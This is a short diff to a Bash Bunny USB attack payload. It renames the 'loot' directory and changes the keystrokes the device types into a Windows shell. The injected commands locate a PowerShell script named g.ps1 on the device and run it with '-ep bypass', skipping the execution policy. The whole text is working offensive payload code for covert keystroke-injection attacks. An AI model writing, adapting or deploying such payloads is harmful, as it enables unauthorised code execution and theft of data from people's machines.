@@ -10,7 +10,7 @@
 #!/bin/bash
 
 # Options
-LOOTDIR=/root/udisk/loot/LocalPwn
+LOOTDIR=/root/udisk/loot/Garfield
 
 ######## INITIALIZATION ########
 LED SETUP
@@ -39,7 +39,7 @@ sleep 1
 Q STRING "exit"
 Q ENTER
 sleep 2
-Q STRING "\$src = (gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\switch2\g.ps1'"
+Q STRING "\$src = (gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\g.ps1'"
 Q ENTER
 sleep 1
 Q STRING "powershell -ep bypass \$src"
